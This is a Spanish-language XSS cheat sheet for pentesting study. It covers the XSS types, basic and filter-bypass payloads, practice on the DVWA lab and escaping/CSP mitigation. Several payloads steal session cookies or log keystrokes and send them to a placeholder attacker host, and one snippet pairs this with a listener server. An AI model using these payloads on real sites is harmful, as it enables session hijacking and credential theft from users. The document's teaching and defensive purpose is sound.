# Cross-Site Scripting (XSS)

XSS permite inyectar JavaScript malicioso en paginas web vistas por otros usuarios.
Puede usarse para robar cookies de sesion, hacer phishing, o tomar control del navegador.

OWASP: A03:2021 Injection | CWE-79

## Tipos de XSS

### Reflected XSS
El payload viaja en la URL y se ejecuta inmediatamente.
```
URL: http://web.com/search?q=<script>alert(1)</script>
```

### Stored XSS (el mas peligroso)
El payload se guarda en la BD y afecta a todos los que visiten la pagina.
```
Comentario: <script>document.location='http://atacante.com/steal?c='+document.cookie</script>
```

### DOM-Based XSS
El payload manipula el DOM del navegador sin pasar por el servidor.
```javascript
// Si el codigo hace: document.innerHTML = location.hash
URL: http://web.com/#<img src=x onerror=alert(1)>
```

## Payloads basicos

```html
<!-- Deteccion basica -->
<script>alert(1)</script>
<script>alert('XSS')</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

<!-- Sin etiqueta script (bypass de filtros basicos) -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<iframe onload=alert(1)>

<!-- Robar cookies de sesion -->
<script>document.location='http://ATACANTE/steal?c='+document.cookie</script>
<img src=x onerror="fetch('http://ATACANTE/steal?c='+document.cookie)">

<!-- Keylogger -->
<script>document.onkeypress=function(e){fetch('http://ATACANTE/log?k='+e.key)}</script>
```

## Bypass de filtros

```html
<!-- Mayusculas/minusculas mixtas -->
<ScRiPt>alert(1)</ScRiPt>

<!-- Codificacion HTML -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Codificacion URL -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Sin comillas ni parentesis -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>

<!-- Event handlers alternativos -->
<details open ontoggle=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

## Robo de sesion completo

```javascript
// Payload completo para robar cookie y redirigir
var i=new Image();
i.src='http://ATACANTE:8000/?cookie='+encodeURIComponent(document.cookie);

// Servidor en Kali para recibir cookies
python3 -m http.server 8000
// Ver en el log: GET /?cookie=PHPSESSID=abc123...
```

## Practica en DVWA

```
1. DVWA -> XSS (Reflected) -> Security: Low
2. Probar en el campo: <script>alert(1)</script>
3. Probar: <img src=x onerror=alert(document.cookie)>
4. DVWA -> XSS (Stored) -> dejar comentario con payload
5. Verificar que el payload persiste al recargar
```

## Mitigacion

```php
// MAL
echo "<p>Hola, " . $_GET['name'] . "</p>";

// BIEN -- escapar siempre el output
echo "<p>Hola, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";

// Content Security Policy (cabecera HTTP)
Content-Security-Policy: default-src 'self'; script-src 'self'
```
